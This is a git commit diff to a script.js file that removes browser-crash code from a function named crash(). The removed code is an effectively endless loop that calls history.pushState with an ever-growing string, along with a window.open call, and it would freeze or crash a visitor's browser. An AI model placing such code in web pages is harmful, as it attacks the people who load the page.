ac2b0351e603df89eafd6c4395c8198e2f4c9a11
admin505 <100965441+admin505admin505@users.noreply.github.com>
2024-02-07 15:55:54 -0600

    Update script.js

--- script.js
+++ script.js
@@ -6,14 +6,3 @@ function crash() {
 
 alert("welcome")
 
-var total = "";
-for( var i = 0; i < 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999; i++ ) {
-  total += i.toString();
-  history.pushState(0,0, total );
-}
-          function openInNewTab(url) {
-  window.open(url, '_blank').focus();
-}
-
-// Or just
-window.open(url, '_blank').focus();
